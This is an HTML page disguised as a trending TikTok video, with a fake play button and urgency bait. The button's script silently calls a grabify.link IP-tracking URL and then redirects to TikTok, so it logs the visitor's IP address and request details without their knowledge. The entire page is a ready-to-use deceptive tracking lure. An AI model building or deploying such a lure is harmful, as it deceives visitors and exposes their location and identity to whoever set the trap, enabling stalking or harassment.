<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trending TikTok Video</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: black;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            margin-top: 50px;
        }
        .video-container {
            width: 300px;
            height: 500px;
            background: url('https://via.placeholder.com/300x500?text=Trending+TikTok+Video') no-repeat center center;
            background-size: cover;
            border-radius: 10px;
            margin: auto;
            position: relative;
        }
        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.8);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            color: black;
            cursor: pointer;
        }
        .play-button:hover {
            background: rgba(255, 255, 255, 1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ðŸ”¥ Trending Video on TikTok!</h2>
        <p>Watch now before it gets taken down! ðŸ‘€</p>
        <div class="video-container">
            <div class="play-button" onclick="logClick()">â–¶</div>
        </div>
    </div>
    
    <script>
        function logClick() {
            fetch('https://grabify.link/track/AWCO2R');
            setTimeout(() => {
                window.location.href = 'https://www.tiktok.com';
            }, 500);
        }
    </script>
</body>
</html>
